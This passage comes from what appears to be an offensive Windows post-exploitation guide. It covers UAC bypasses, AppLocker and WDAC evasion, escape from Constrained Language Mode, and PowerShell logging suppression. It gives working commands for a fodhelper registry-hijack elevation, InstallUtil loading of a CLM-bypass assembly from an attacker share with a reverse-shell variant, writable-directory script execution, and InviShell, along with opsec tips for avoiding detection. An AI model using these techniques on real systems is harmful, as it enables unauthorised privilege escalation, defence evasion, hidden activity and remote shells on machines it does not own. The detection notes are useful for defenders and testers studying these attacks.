| `ConsentPromptBehaviorAdmin` = 1 or 3 | Prompt for *credentials*, not just consent. You need the password, not merely a click |
| `PromptOnSecureDesktop` = 1 | The prompt runs on an isolated desktop that your process cannot interact with or screenshot, ruling out consent-clicking and prompt-spoofing |
| `FilterAdministratorToken` = 0 | The default. The built-in RID 500 Administrator account is exempt from filtering and runs unelevated processes with a full token. If you are RID 500, you are already effectively elevated |
| `LocalAccountTokenFilterPolicy` = 1 | Removes UAC filtering for local accounts authenticating *over the network*, which is what makes local-administrator SMB, WMI and WinRM administration work remotely. Its absence is why a valid local admin hash often yields `STATUS_ACCESS_DENIED` on admin shares. Domain accounts in Administrators are never filtered remotely |

The practical summary: at "Always notify" the mechanism-based bypasses that rely on silent auto-elevation stop working and you are looking at token theft from an existing elevated process, or at social engineering the prompt. At the default setting, most of the published families work. With `EnableLUA` = 0, the question does not arise.

### Family one: auto-elevating binaries and registry-based handler hijack

**Why it works.** A set of Microsoft-signed binaries carry `autoElevate=true` in their embedded application manifest. When such a binary is launched by a member of the Administrators group, and it is Microsoft-signed, and it resides in a directory the system considers secure (`System32` and a small set of others), `AppInfo` elevates it without any prompt at the default UAC level. That is by design, so that Windows management tools do not prompt constantly.

The bypass exploits the fact that several of those binaries, once running at high integrity, consult **per-user** configuration to decide what to execute next. `HKCU` is writable at medium integrity by definition, since it is the user's own hive. So you write a value that the high-integrity process will read and act on, then launch the auto-elevating binary. It elevates silently, reads your value, and executes your command at high integrity.

The canonical instance uses a COM or shell handler registration under `HKCU\Software\Classes`. `HKCU\Software\Classes` takes precedence over `HKLM\Software\Classes` for the user's COM and protocol handler lookups, because the merged `HKEY_CLASSES_ROOT` view resolves per-user entries first. So a per-user registration overrides the machine one for that user, including for the elevated process, because the elevated process is still that user.

```cmd
:: fodhelper: reads the ms-settings protocol handler from the per-user classes hive
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "C:\Windows\Tasks\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
start fodhelper.exe
:: then remove both values
reg delete "HKCU\Software\Classes\ms-settings" /f
```

The empty `DelegateExecute` value is the part people omit and then wonder why nothing happens. Its presence tells the shell execution machinery to use the `command` value directly rather than looking for a delegate COM object to handle the verb.

The same shape applies to a family of binaries, each with a different handler it consults:

| Binary | Handler or key consulted |
| --- | --- |
| `fodhelper.exe` | `ms-settings` protocol handler |
| `computerdefaults.exe` | `ms-settings` protocol handler |
| `eventvwr.exe` | `mscfile` class shell open command |
| `CompMgmtLauncher.exe` | `mscfile` class shell open command |
| `sdclt.exe` | `Folder` class shell open command, and the `App Paths` entry for `control.exe` |
| `slui.exe` | `exefile` class shell open command |
| `wsreset.exe` | An AppX package activation registration |

**The general rule, which is what to remember.** Find a binary that auto-elevates, then find any per-user-writable input it reads: a protocol handler, a file-class verb, an `App Paths` entry, a COM CLSID registration, an environment variable, a `.NET` configuration knob, or a file in a user-writable directory it loads by relative path. The published names come and go as each is patched; the pattern does not. Enumerate candidates by dumping manifests:

```powershell
# candidate auto-elevating binaries: manifest contains autoElevate
Get-ChildItem C:\Windows\System32\*.exe -ErrorAction SilentlyContinue | ForEach-Object {
  $b = [IO.File]::ReadAllBytes($_.FullName)
  $s = [Text.Encoding]::ASCII.GetString($b)
  if ($s -match 'autoElevate\s*>\s*true' -or $s -match 'autoElevate="true"') { $_.FullName }
}
```

That is a crude string scan of the embedded manifest rather than proper resource parsing, so expect a few false positives, but it finds the list on whatever build you are actually standing on rather than relying on a list from 2020.

**Detection and opsec.** These are among the best-detected techniques on Windows. The registry write to `HKCU\Software\Classes\ms-settings`, `\mscfile` or `\exefile` is a high-fidelity signal with essentially no legitimate cause, caught by Sysmon 12 and 13 and by every EDR product. The process tree is equally distinctive: `fodhelper.exe` spawning `cmd.exe` or `powershell.exe` has no benign explanation, and neither does an elevated child appearing without `consent.exe` in the ancestry. Delete the keys immediately, but understand that the write has already been recorded. Prefer a payload path and filename that is not `cmd.exe`, and prefer having the elevated process do its work in-process rather than spawning a shell.

### Family two: elevated COM objects

**Why it works.** COM supports an elevation moniker. A client calls `CoCreateInstance` with a moniker of the form `Elevation:Administrator!new:{CLSID}` and the COM runtime asks `AppInfo` to launch the out-of-process server elevated. Certain registered COM objects are configured for **auto-approval**: `AppInfo` will elevate them without prompting if the *requesting process* satisfies the auto-approval criteria, meaning it is Microsoft-signed and located in a secure directory.

Two things are then needed. First, an elevated COM interface with a method that performs something useful. The recurring examples are an interface exposing a shell-execute style method, and `IFileOperation`, which performs copy, move, delete and rename operations with the elevated server's privileges and therefore constitutes an arbitrary privileged file write into `System32`. Second, a way to satisfy the auto-approval check, because your own process is not a Microsoft-signed binary in `System32`.

That second requirement is the interesting half and the part usually glossed over. The techniques used to satisfy it are:

- **Process image masquerading.** Modify the `PEB` of your process so that the image path it reports is that of an auto-approved binary, then make the COM request. `AppInfo` queries the requesting process's image path over RPC and is misled.
- **Injecting into an already-auto-approved process.** Write your COM-invoking code into a running Microsoft-signed process in `System32` and make the request from there. Trivially satisfies the check because the check is true.
- **Launching an auto-approved binary and hijacking its execution flow**, typically via a DLL it loads from a location you control, which reduces to the DLL hijack problem inside a process that is already trusted.

Once the elevated COM server is instantiated, the file operation or command execution it performs is your escalation. `IFileOperation` used to copy a DLL into `System32` is then combined with a DLL hijack in an auto-elevating binary, which is why these two families are usually chained rather than used alone.

**Detection and opsec.** Elevation moniker use is observable, and the well-known CLSIDs are watched. The masquerading step is itself detectable, since a process whose PEB image path disagrees with its actual mapped image is anomalous and ETW Threat Intelligence surfaces the remote memory writes involved in the injection variant. The file operation lands a new DLL in `System32`, which is independently alerted on.

### Family three: token theft from an existing elevated process

If an elevated process belonging to the same user is already running, and you hold `SeDebugPrivilege` or `SeImpersonatePrivilege`, you can open it, duplicate its token, and create a process with it. No registry writes, no auto-elevation, works regardless of the UAC slider position, because it does not use the elevation mechanism at all. The catch is the precondition: from a filtered medium-integrity token you generally cannot open a high-integrity process of the same user, because the mandatory integrity policy denies write access across levels and `PROCESS_DUP_HANDLE` requires it. Read-only access across the boundary is permitted in some configurations, and where it is, `DuplicateHandle` on an existing token handle is enough.

This is also the family that covers "the user is already an unfiltered administrator", which is far more common than it should be: RID 500 with `FilterAdministratorToken` at its default, `EnableLUA` disabled by a legacy application's requirements, or a service account that is a full administrator by design.

### Family four: environment variable and scheduled task abuse

Some scheduled tasks registered by Windows itself run with highest privileges and expand environment variables, including per-user ones, when resolving their action. Setting a user environment variable that the elevated task then expands gives execution at the task's privilege level with no prompt, no auto-elevation and no COM. The disk cleanup maintenance task has been the recurring instance of this shape. It is worth checking for on any build:

```powershell
Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -eq 'Highest' } | ForEach-Object {
  foreach ($a in $_.Actions) {
    if ("$($a.Execute) $($a.Arguments) $($a.WorkingDirectory)" -match '%\w+%') {
      [pscustomobject]@{ Task = $_.TaskName; Execute = $a.Execute; Args = $a.Arguments; Wd = $a.WorkingDirectory }
    }
  }
}
```

`%windir%`, `%SystemRoot%` and `%ProgramFiles%` are protected system variables that a user cannot override in a way that affects a task running as another principal, but `%TEMP%`, `%TMP%`, `%APPDATA%` and `%LOCALAPPDATA%` are per-user and are exactly the ones maintenance tasks tend to reference.

### Choosing between them

Check the UAC configuration first, because it eliminates families immediately. Then prefer, in order: an already-unfiltered token if you have one, token theft if the precondition holds, an environment or task-based path because it leaves the fewest artefacts, and only then a registry handler hijack, accepting that the last is the most likely to be detected. Whichever you use, clean up the registry values in the same execution rather than in a later command, so that the window in which an artefact exists is measured in milliseconds.

## Constrained Language Mode, AppLocker and WDAC

### The relationship, which is the thing to understand first

The source notes check for Constrained Language Mode and check the AppLocker policy in adjacent lines without ever saying that these are the same finding. They are. **Constrained Language Mode is not a control in its own right. It is PowerShell's reaction to an application control policy being in force.**

The mechanism: when PowerShell starts, and whenever it is about to run a script file, it asks the system what the application control policy says. If no policy is enforced, everything runs in `FullLanguage`. If a policy is enforced, PowerShell asks the policy about each script file it is asked to execute. A script the policy *trusts* runs in `FullLanguage`. Anything the policy does not trust, including every line you type interactively, every string passed to `-Command`, everything piped in on stdin, and every script you download and `Invoke-Expression`, runs in `ConstrainedLanguage`. The reasoning is sound: an application control policy that permits `powershell.exe` but not arbitrary scripts would be pointless if arbitrary typed-in PowerShell could load .NET assemblies and call `VirtualAlloc`. Constrained Language Mode closes that hole.

Three consequences follow immediately, and they are the whole strategy for this section.

1. **If you are in CLM, there is an application control policy, and you need to identify it before doing anything else.** CLM tells you a policy exists; it does not tell you whether it is AppLocker or WDAC, or which collections are enforced. Those determine what works.
2. **Getting your code into a location or signature the policy trusts converts CLM into FullLanguage automatically.** You do not need a CLM "bypass" if you can write a `.ps1` into a directory the policy allows. That is the direct link between the CLM section of the source notes and the world-writable directory list a few lines below it, which the source never connects.
3. **Leaving PowerShell entirely sidesteps CLM completely, under AppLocker.** Under WDAC it does not. That difference is the most important practical distinction between the two technologies and is explained below.

There is a legacy fourth trigger worth knowing: the `__PSLockdownPolicy` environment variable, where a value of `4` forces `ConstrainedLanguage`. Because it is an ordinary environment variable that the user can set and unset, it is not a security control, and encountering CLM caused by it alone means you clear the variable and start a new PowerShell process. Check it before assuming a real policy exists.

```powershell
$ExecutionContext.SessionState.LanguageMode
$env:__PSLockdownPolicy
[System.Management.Automation.Security.SystemPolicy]::GetSystemLockdownPolicy()
```

That third line is the one that actually answers the question, because it reports what the *system* policy is, as PowerShell sees it: `None`, `Audit` or `Enforce`. `None` with a constrained session means the environment variable or a session configuration is responsible. `Enforce` means a real policy, and specifically a WDAC policy or an enforced AppLocker script collection.

### Language modes

| Mode | What is available |
| --- | --- |
| `FullLanguage` | Everything. All .NET types, `Add-Type`, `New-Object` on anything, COM, reflection |
| `ConstrainedLanguage` | Cmdlets, functions, the pipeline, variables and operators all work. Only an allowed list of core .NET types can be used, method invocation on other types is blocked, `Add-Type` is blocked, COM object creation is blocked, arbitrary type casts and static method calls are blocked |
| `RestrictedLanguage` | No script blocks, no method calls at all, a very small set of variables and operators. Used for data sections and manifests |
| `NoLanguage` | No script text may be evaluated. Only pre-registered commands may be invoked. This is what JEA endpoints use |

The important nuance for CLM: cmdlets still work, and cmdlets are powerful. `Get-Content`, `Invoke-WebRequest`, `Start-Process`, `New-ItemProperty`, `Get-ChildItem`, `Copy-Item`, `Get-ADUser` if the module is present, and the entire built-in module surface remain available. A great deal of enumeration and lateral movement is possible entirely within CLM. What you cannot do is anything requiring .NET: no in-memory assembly loading, no `P/Invoke`, no shellcode, no reflective work, which is precisely why offensive PowerShell tooling breaks and ordinary administration does not.

### Determining which control is in force, and in which mode

**AppLocker.** Enforced by the `appid.sys` driver together with the **Application Identity** service (`AppIDSvc`). If that service is not running, AppLocker is not enforcing, and its start type is worth checking as the first question.

```powershell
Get-Service AppIDSvc | Select-Object Name, Status, StartType
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Local -Xml
```

The XML is what you want, not the object view the source notes use. Each `RuleCollection` element carries a `Type` of `Exe`, `Dll`, `Script`, `Msi` or `Appx` and an `EnforcementMode` of `Enabled`, `AuditOnly`, or absent entirely. Read all five. The two things you are looking for:

- **Which collections are configured at all.** The `Dll` collection is very commonly left unconfigured, because enforcing DLL rules imposes a measurable performance cost and Microsoft's own guidance is cautious about it. An unconfigured `Dll` collection means any DLL can be loaded by any allowed executable, which reduces AppLocker to a formality: a signed, allowed host plus your DLL is unrestricted code execution.
- **Whether enforcement is `AuditOnly`.** In audit mode nothing is blocked, and the event log records what *would* have been blocked. That is a free read of the policy's blind spots, and it is a very common state because organisations deploy in audit mode and never move on.

The policy is also readable from the registry when the cmdlets are unavailable or you would rather not call them:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 /s
```

Each collection appears as a subkey with an `EnforcementMode` DWORD, where `0` is audit and `1` is enforce, and the individual rules as GUID-named subkeys containing their XML.

Testing a specific file against the policy before you run it is far better than finding out by being blocked:

```powershell
Get-AppLockerFileInformation -Path C:\Windows\Tasks\payload.exe |
  Test-AppLockerPolicy -XmlPolicy .\effective.xml -User $env:USERNAME
```

AppLocker's own event logs are under `Applications and Services Logs\Microsoft\Windows\AppLocker`, split into `EXE and DLL`, `MSI and Script`, and the packaged app logs.

| Event ID | Log | Meaning |
| --- | --- | --- |
| 8002 | EXE and DLL | Allowed to run |
| 8003 | EXE and DLL | Would have been blocked, audit mode only |
| 8004 | EXE and DLL | Blocked |
| 8005 | MSI and Script | Allowed to run |
| 8006 | MSI and Script | Would have been blocked, audit mode only |
| 8007 | MSI and Script | Blocked |
| 8028 | MSI and Script | WDAC would have blocked this script, audit mode |
| 8029 | MSI and Script | WDAC blocked this script |

The 8028 and 8029 pair is how WDAC script enforcement reports itself, which is confusing but useful: seeing those rather than 8006 and 8007 tells you the constraint is WDAC, not AppLocker.

**WDAC.** Windows Defender Application Control is kernel-enforced code integrity driven by a compiled policy binary. It is a different and much stronger thing.

```powershell
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard |
  Select-Object CodeIntegrityPolicyEnforcementStatus, UsermodeCodeIntegrityPolicyEnforcementStatus,
                SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus,
                AvailableSecurityProperties
```

For both enforcement status fields, `0` is off, `1` is audit mode, `2` is enforced. `UsermodeCodeIntegrityPolicyEnforcementStatus` is the one that governs your payloads.

On Windows 11 and Server 2022 and later, `CiTool` enumerates the active policies directly:

```cmd
CiTool --list-policies
```

The policy files themselves are on disk and readable, which is a gift, because reading the policy tells you exactly what is allowed:

```text
C:\Windows\System32\CodeIntegrity\SiPolicy.p7b
C:\Windows\System32\CodeIntegrity\CiPolicies\Active\*.cip
```

Those are binary, but `ConvertFrom-CIPolicy` has an inverse in the `ConfigCI` module for converting a policy binary back to XML, and where that module is unavailable the binary still yields readable publisher names, file names and hashes to a strings pass, which is usually enough to find the gaps.

WDAC blocks are logged to `Microsoft-Windows-CodeIntegrity/Operational`, with **3076** for an audit-mode block that was allowed through, **3077** for an enforced block, and **3033** and **3034** for signing-level failures.

### Why WDAC is materially harder than AppLocker

| Dimension | AppLocker | WDAC |
| --- | --- | --- |
| Enforcement point | User-mode service plus a filter driver, consulted at process creation | Kernel code integrity, evaluated on every image load |
| DLL coverage | A separate collection, commonly unconfigured | Always covered, not optional |
| Default administrator exemption | Default rule set includes "allow everything for the Administrators group" | No such concept. Administrators are subject to the policy |
| Path rules | First-class and widely used | Available but discouraged, and a runtime option can reject paths that are user-writable |
| Removability by an administrator | An administrator can simply turn off `AppIDSvc` or change the GPO | A signed policy cannot be removed even by an administrator without the signing key |
| .NET dynamic code | Not addressed | The Dynamic Code Security option extends enforcement to assemblies loaded from memory by the .NET runtime, which breaks `Assembly.Load` of a byte array |
| Hosted PowerShell runspaces | Not constrained, because there is no script file for the policy to evaluate | Constrained, because the lockdown policy is a system-wide property that a hosted runspace inherits |
| Known interpreter LOLBins | Must be blocked by the administrator explicitly | Microsoft publishes a recommended block rules list that covers the well-known ones, and it is widely deployed |

The two rows that change your approach most are the last three. Under AppLocker, dropping out of PowerShell into a custom .NET host solves CLM outright. Under WDAC with usermode enforcement, it does not, because `GetSystemLockdownPolicy` returns `Enforce` for the whole system and any runspace you create anywhere is constrained. And with Dynamic Code Security enabled, the in-memory assembly loading that most modern C2 frameworks depend on fails as well, which is a much bigger problem than being unable to run `.exe` files.

Microsoft's **recommended block rules** list is the document to check against before planning any living-off-the-land approach, because in a WDAC deployment it is likely already in force and it covers `msbuild.exe`, `installutil.exe`, `mshta.exe`, `regsvcs.exe`, `regasm.exe`, `presentationhost.exe`, `wmic.exe`, `cdb.exe`, `kd.exe`, `ntsd.exe`, `windbg.exe`, `csi.exe`, `rcsi.exe`, `dnx.exe`, `msxsl.exe`, `te.exe`, the older PowerShell 2.0 engine assemblies, and a long tail of others. Every technique in the next section that names one of those binaries should be checked against the active policy first.

### Bypass family one: trusted signed binaries that execute arbitrary code

**Why it works.** A policy that allows everything Microsoft-signed and everything in `C:\Windows` is allowing several hundred binaries, and some of those binaries are general-purpose interpreters, compilers or script hosts. The policy evaluates the *host*, which is legitimately allowed, and never sees the payload, which is data as far as the policy is concerned.

The canonical catalogue is the **LOLBAS** project, and it should be consulted rather than memorised, because entries are added and blocked continuously. The classes are worth knowing:

| Class | Examples | What the payload is |
| --- | --- | --- |
| Script hosts | `mshta.exe`, `wscript.exe`, `cscript.exe` | HTA, JScript, VBScript |
| COM scriptlet loaders | `regsvr32.exe` with `scrobj.dll` | A remote or local `.sct` scriptlet |
| DLL entry point invokers | `rundll32.exe` | A DLL and an exported function name |
| Compilers on the box | `csc.exe`, `vbc.exe`, `jsc.exe` in the .NET Framework directories | C#, VB or JScript source |
| Build and install tooling | `msbuild.exe`, `installutil.exe`, `regasm.exe`, `regsvcs.exe` | A project file or a .NET assembly |
| Installer and configuration engines | `msiexec.exe`, `cmstp.exe`, `odbcconf.exe`, `pcalua.exe` | MSI, INF, or a DLL registration |
| Data transformation | `wmic.exe` with an XSL format, `msxsl.exe` | An XSL stylesheet containing script |
| Debuggers | `cdb.exe`, `windbg.exe`, `ntsd.exe` | Debugger command scripts |
| Modern runtimes | `dotnet.exe`, `python.exe`, `node.exe` where installed | Whatever that runtime executes |

That last row is the one that most often survives in a real deployment, because policies are written against a list of Windows binaries and then a development team installs the .NET SDK, Python or Node on their machines and nobody updates the policy. Check what interpreters are actually installed before assuming you need a clever technique.

### Bypass family two: the .NET-based paths, including InstallUtil

The source notes show the InstallUtil approach twice without explaining it, which is a shame, because the explanation is what makes it adaptable.

**What it is.** `InstallUtil.exe` is the .NET Framework installer utility, shipped in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\` and Microsoft-signed. Given an assembly and the `/U` switch, it loads the assembly and calls the `Uninstall` method of every class marked as an installer.

**Why it works.** Two separate things.

First, the *execution* itself. `InstallUtil.exe` is an allowed executable. It loads your assembly and invokes a method in it. Under AppLocker with the DLL collection unconfigured, the assembly load is not evaluated at all. Under AppLocker with the DLL collection enforced, whether it is caught depends on how the assembly is loaded and from where. The class you write must be decorated with `[System.ComponentModel.RunInstaller(true)]` and derive from `System.Configuration.Install.Installer`, and your code goes in an override of `Uninstall`. Critically, `Uninstall` is invoked *before* `InstallUtil` performs any of the validation that a real installer assembly would require, so a malformed installer that only exists to run code works fine.

Second, and this is the part specific to escaping CLM, the *language mode of what runs next*. Your `Uninstall` method creates a PowerShell runspace in-process by referencing `System.Management.Automation` directly, rather than launching `powershell.exe`. Under AppLocker, that runspace is `FullLanguage`, because AppLocker-induced CLM is decided by evaluating a *script file* against the script rule collection, and there is no script file. You are hosting the engine yourself and feeding it strings from managed memory. That is the whole trick behind the `PSBypassCLM` family the source links to, and stating it plainly is more useful than the two URLs: **a custom .NET host of the PowerShell engine gets FullLanguage under AppLocker because the policy has nothing to evaluate.**

Under WDAC, this fails. The lockdown policy is a system-wide state, queried by the automation engine when the runspace initialises, and it returns `Enforce` regardless of how the engine was hosted. That single difference is the clearest illustration of why WDAC is a different class of control.

```cmd
:: local assembly
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe

:: from a share, avoiding a disk write on the target
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U \\$ATTACKER\share\bypass.exe
```

`/logfile=` with no value suppresses the log file and `/LogToConsole=false` suppresses console output, which is purely about not leaving artefacts and not printing installer errors over your shell. Where the assembly itself takes parameters, they are passed on the same command line and read from the installer's context, which is how the reverse-shell variants take a host and port:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=$ATTACKER /rport=$LPORT /U \\$ATTACKER\share\PSBypassCLM.exe
```

Note that `/revshell`, `/rhost` and `/rport` are not `InstallUtil` switches. They are arbitrary parameters that `InstallUtil` passes through to the assembly, and they only work because that particular assembly reads them. Anything you write can define its own.

The sibling techniques in the same family:

- **`MSBuild` inline tasks.** A `.csproj` or `.xml` project file containing a `UsingTask` with `TaskFactory="CodeTaskFactory"` and an inline `<Code Type="Class" Language="cs">` block. MSBuild compiles and executes it in-process. Same reasoning, same FullLanguage runspace availability, and MSBuild is in the recommended block rules so check first.
- **`csc.exe` on the box.** Compile your loader locally, which turns a source file into a signed-compiler-produced binary. It does not make the *output* allowed, so this is only useful where the policy is publisher-based on the compiler rather than path-based on the output, or where you are compiling into an allowed path.
- **`regasm.exe` and `regsvcs.exe`.** Same assembly-method-invocation shape as `InstallUtil`, different entry point attributes.
- **In-memory assembly loading from your C2.** The general case, and the one that WDAC's Dynamic Code Security specifically addresses.

**Detection and opsec.** `InstallUtil.exe` executing anything is a well-known signature and appears in nearly every detection rule set, particularly `InstallUtil` with `/U` and a path outside a software distribution directory, and `InstallUtil` as the parent of a network connection. The .NET runtime also emits ETW events for assembly loads, so the assembly name and its lack of a signature are visible even without a file on disk. Loading from a UNC path adds an outbound SMB connection from `InstallUtil.exe`, which is its own anomaly. If you can write to disk in an allowed directory, prefer that over the share.

**Failure modes.** `An exception occurred while trying to find the installers in the ... assembly` means your class is missing `RunInstaller(true)` or does not derive from `Installer`. `Could not load file or assembly` on a UNC path is usually .NET's remote-assembly trust behaviour or plain SMB access denial. A silent no-op means you put your code in `Install` rather than `Uninstall` while using `/U`. An architecture mismatch shows up as a `BadImageFormatException`, so match the `Framework64` and `Framework` directories to how the assembly was built.

### Bypass family three: script host alternatives and what the script collection does not cover

AppLocker's script rule collection covers `.ps1`, `.bat`, `.cmd`, `.vbs` and `.js`. That extension list is the policy's whole notion of what a script is, and everything outside it is only ever evaluated as whichever executable opens it.

The consequences worth exploiting:

- **HTA content is not in the list.** `mshta.exe` is evaluated as an executable, is allowed, and the HTML application it renders, including its embedded JScript or VBScript, is never assessed.
- **A `.js` or `.vbs` file renamed to an extension outside the list** may execute via an explicit host invocation without triggering the script collection, depending on how the host is invoked.
- **Script content that never becomes a file** is not assessed by the script collection either. `powershell -EncodedCommand`, a script piped in on stdin, and `Invoke-Expression` of a downloaded string all run without a script rule evaluation. This is exactly the hole that CLM exists to plug, and it is why the answer to "the policy did not block my script" is often "no, but you are in ConstrainedLanguage now".
- **PowerShell 2.0 downgrade** (`powershell -version 2`) historically bypassed AMSI and script block logging along with much else, because the version 2 engine predates them. The .NET Framework 2.0 and PowerShell 2.0 engine are not installed by default on current Windows, and the engine assemblies are in the WDAC recommended block rules, so treat this as mostly dead but worth a single check on legacy servers.

### Bypass family four: writable and allowed paths, and why the directory list works

This is where the source notes have real content, and it deserves the explanation it never got.

AppLocker's **default rule set** contains path rules that allow everything under `%WINDIR%` and everything under `%PROGRAMFILES%`, plus a rule allowing everything for the `Administrators` group. The rationale is that those directories are protected by ACLs, so only an administrator can put a file there, so anything there is implicitly trusted. That rationale is wrong, because a handful of directories inside `C:\Windows` grant write access to ordinary users for legitimate functional reasons: the print spooler needs a spool directory, fax needs a temporary directory, tracing needs somewhere to write logs, per-user scheduled tasks need per-user state, and the crypto machine-keys directory needs to be writable so that non-administrative services can create key containers.

So the two conditions coincide. The path rule says *allowed because it is under `%WINDIR%`*. The ACL says *writable because a component needs it to be*. Put those together and you have a directory where an unprivileged user can both write a file and execute it.

**That is the lesson, and it generalises: a path-based allowlist is only as strong as the write ACLs beneath every allowed path.** The specific directory list is a symptom. The reason it matters that you understand this is that the list changes between Windows builds, feature updates and third-party software installations, and the list below is a starting point, not an answer.

```text
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\Tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

`C:\Windows\System32\Tasks_Migrated` only exists after an in-place Windows version upgrade, which is a useful tell in itself: hosts that have been upgraded rather than rebuilt accumulate these.

Rather than trusting a static list, enumerate the real one on the host you are standing on. Every allowed path, tested for write access by your actual effective token:

```powershell
# recursive write test under an allowed root, using an empirical write rather than ACL parsing
$root = 'C:\Windows'
Get-ChildItem $root -Directory -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
  $f = Join-Path $_.FullName ([guid]::NewGuid().ToString('N'))
  try { [IO.File]::WriteAllText($f, ''); Remove-Item $f -Force; $_.FullName } catch { }
}
```

That walk is slow and generates a lot of file system activity, so scope it to `C:\Windows\System32` or run it once and keep the results. `accesschk` does the same job faster and is Microsoft-signed:

```cmd
accesschk.exe -uwdqs "Authenticated Users" C:\Windows
accesschk.exe -uwdqs "Users" C:\Windows
accesschk.exe -uwdqs "Everyone" C:\Windows
```

Also check `C:\Program Files` and `C:\Program Files (x86)` with the same queries. Third-party installers create user-writable subdirectories under `Program Files` regularly, and those are covered by the second default path rule.

**And the CLM connection.** A `.ps1` file written into one of these directories is, as far as an AppLocker path rule is concerned, an allowed script. An allowed script runs in `FullLanguage`. So the simplest escape from Constrained Language Mode under a default-rule AppLocker deployment is not `InstallUtil` at all, it is writing your script to `C:\Windows\Tasks\x.ps1` and running it. Test it before reaching for anything more complicated:

```powershell
Set-Content -Path C:\Windows\Tasks\lm.ps1 -Value '$ExecutionContext.SessionState.LanguageMode'
powershell -File C:\Windows\Tasks\lm.ps1
```

If that prints `FullLanguage`, you are done, and you never touched a signatured binary.

**Detection and opsec.** These directories are well known to defenders as well, and a mature detection set alerts on executable or script file creation in any of them, particularly `C:\Windows\Tasks` and `C:\Windows\Temp` which have almost no legitimate reason to receive a `.exe` or `.ps1` from a user context. `C:\Windows\System32\spool\drivers\color` is watched specifically because of how heavily it has been abused. Prefer a directory that has a plausible reason to contain your file type, delete afterwards, and consider that a writable subdirectory under a third-party `Program Files` installation is far less scrutinised than any of the well-known Windows ones.

### Bypass family five: the DLL collection gap

Worth its own note because it is the single most common real-world weakness. If `Get-AppLockerPolicy -Effective -Xml` shows no `Dll` rule collection, or one that is `AuditOnly`, then:

- `rundll32.exe your.dll,EntryPoint` executes arbitrary native code with no policy evaluation of the DLL.
- Any DLL hijack against any allowed executable is unrestricted code execution.
- A .NET assembly loaded by an allowed host is not assessed.

Check this before spending time on anything else. It converts application control from an obstacle into a formality.

### InviShell and subverting registry-based script logging configuration

The source notes list `RunWithRegistryNonAdmin.bat` with no explanation. The technique is worth understanding because it generalises.

**What it is.** InviShell launches a PowerShell session in which script block logging, module logging and transcription are effectively inoperative, without requiring administrative rights.

**Why it works.** PowerShell reads its logging configuration, and instantiates the COM components involved in some of that logging and in AMSI, at engine start. Both of those lookups can be influenced from the user's own hive:

- **COM registration precedence.** `HKEY_CLASSES_ROOT` is a merged view in which `HKCU\Software\Classes` takes precedence over `HKLM\Software\Classes` for the current user. Registering a CLSID under `HKCU\Software\Classes\CLSID\{...}` with an `InprocServer32` pointing at a DLL of your own means that when a process running as you resolves that CLSID, it loads your DLL instead of the real one. If the CLSID in question is one the logging or AMSI initialisation path depends on, that path is now under your control. This is ordinary COM hijacking applied to a logging component, and it needs no privilege because `HKCU` is yours by definition.
- **Policy key precedence.** The PowerShell logging settings are read from `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\{ScriptBlockLogging,ModuleLogging,Transcription}`. Where the setting has not been delivered by machine policy, a corresponding `HKCU\Software\Policies\...` value is honoured, and where it has been delivered by *preference* rather than by a locked GPO, the effective value can be influenced from the user hive.

`RunWithRegistryNonAdmin.bat` implements the first of those: it writes the per-user CLSID registrations, launches `powershell.exe`, and removes the registrations when the shell exits. The result is a PowerShell process whose logging components are inert.

```cmd
:: the batch file sets HKCU CLSID registrations, launches PowerShell, and cleans up on exit
C:\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

**The generalisation, which is the useful part.** There are three distinct places to interfere with PowerShell telemetry, with very different detectability:

1. **Registry, before the process starts.** Cheap, requires no memory manipulation, but leaves registry artefacts under `HKCU\Software\Classes\CLSID` that are a strong signal if anyone looks for them. Any `InprocServer32` under `HKCU` pointing at a non-standard DLL path is anomalous.
2. **In-process, against the ETW provider.** Script block logging is delivered over ETW, and the provider's registration handle and enablement mask live in the process's own memory. Neutralising them requires no registry write and leaves no disk artefact, but requires the ability to patch memory, which means you need `FullLanguage` or native code first, so it is a step you take after escaping CLM, not before.
3. **In-process, against AMSI.** Discussed under AMSI in the next section.

**Detection and opsec.** Script block logging events **4104** at warning level fire for content matching a built-in suspicious-content list even when script block logging is not enabled by policy, which means a logging bypass that only addresses the policy setting still misses that path. Transcription is the most damaging of the three if left running, because it records output as well as input, so a transcript of your session is a complete record of everything you learned. Check for it before you type anything sensitive:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -ErrorAction SilentlyContinue
```

A configured `OutputDirectory` for transcription pointing at a network share means your transcript has already left the host.

## PowerShell as a constrained environment

